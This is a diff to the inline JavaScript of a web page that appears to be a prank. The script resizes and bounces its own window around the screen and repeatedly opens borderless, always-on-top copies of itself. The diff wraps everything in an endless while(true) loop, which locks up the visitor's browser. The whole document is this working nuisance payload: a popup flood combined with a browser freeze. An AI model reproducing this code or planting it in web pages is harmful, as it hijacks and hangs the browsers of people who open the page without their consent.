@@ -8,29 +8,31 @@ var xOff = 5;
 var yOff = 5;
 var xPos = 400;
 var yPos = -100;
-xPos += xOff;
-yPos += yOff;
-if (xPos > screen.width - 357) {
-	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-};
-if (xPos < 1) {
-	xOff = Math.ceil( 7 * Math.random()) * 5 - 10;
-};
-if (yPos > screen.height - 330) {
-	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
-};	
-if (yPos < 1) {
-	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
-};
-resizeTo(357, 330);
-moveTo(xPos, yPos);
-function loop() {
-	if (location.port == "") {
-		open(location.protocol+"//"+location.hostname+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
-	} else {
-		open(location.protocol+"//"+location.hostname+":"+location.port+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
+while (true) {
+	xPos += xOff;
+	yPos += yOff;
+	if (xPos > screen.width - 357) {
+		xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
 	};
+	if (xPos < 1) {
+		xOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+	};
+	if (yPos > screen.height - 330) {
+		yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	};	
+	if (yPos < 1) {
+		yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+	};
+	resizeTo(357, 330);
+	moveTo(xPos, yPos);
+	function loop() {
+		if (location.port == "") {
+			open(location.protocol+"//"+location.hostname+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
+		} else {
+			open(location.protocol+"//"+location.hostname+":"+location.port+location.pathname, "_blank", "menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes");
+		};
+	};
+	setTimeout(loop, 12345);
 };
-setTimeout(loop, 12345);
 	</script>
 </html>
